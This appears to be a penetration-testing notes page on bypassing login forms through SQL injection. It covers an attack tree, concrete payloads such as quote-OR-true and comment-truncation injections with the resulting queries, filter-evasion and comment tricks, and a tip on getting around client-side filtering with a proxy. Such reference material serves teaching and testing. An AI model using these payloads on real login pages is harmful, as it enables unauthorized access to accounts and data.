# SQL injection login bypass

## Attack tree

```text
1 SQL injection login bypass
    1.1 Find out if the database is vulnerable (AND)
        1.1.1 Inject data in the query without breaking it
    1.2 Build an SQL segment that will modify the WHERE clause and make it true (AND)
        1.2.1 Use login page logic to create an SQL segment on admin 
    1.3 Inject 
    1.4 Post exploitation
```

## Example SQL segments

```text
SELECT * FROM users WHERE username='$USERNAME' AND password='$PASSWORD'
```

Assume a login form with two input fields (username and password) which are both vulnerable (page breaks on 
entering a `'` and responds to changed queries), meaning, the backend script generates a query to validate username and 
password provided by the user and quotes are not correctly handled (escaped) by the application and allow an adversary 
to modify the query. 

The page logic:

```text
admin
wrong' OR 'a'='a
```

Results in a WHERE clause which is true:

```text
SELECT * FROM users WHERE username='admin' AND password='wrong' OR 'a'='a'
```
Because of operator precedence, the AND condition is evaluated first. Then the OR operator is evaluated, making the 
WHERE clause true. Even more, the condition will be true for all rows of the users table and as a result,
username is ignored and the adversary will be logged in as the first user in users table.

The page logic:

```text
admin' --
whatever
```

Also results in a WHERE clause which is true, but now the adversary logs in as admin:

```text
SELECT * FROM users WHERE username='admin' -- AND password='whatever'
```

Line commenting eliminates a part of the login condition and gains access.
Note: For some DBMS, a space needs to be added before and after `--`.

## SQLi tips

Examples of TRUE statements for discovering sqli:

    aNd 1=1
    aNd 21=21
    orDeR bY 1

Examples of FALSE statements

    dNd 0=1
    anD 9=2
    ordEr bY 1000000000000

Characters to use instead of spaces:

    +, /**/, %20

Examples: orDeR bY 1 can be re-written as

    orDer+bY+1
    orDer/**/bY/**/1
    orDer%20bY%201

Comments to end the queries:

    /*
    //
    #
    %23

Sometimes you might need to add ';' before the comment, examples:

    anD 1=1//
    anD 1=1;//

## Notes

If the simple login bypass is not working, check with Burp proxy whether there is client side filtering. If so, modify the request.
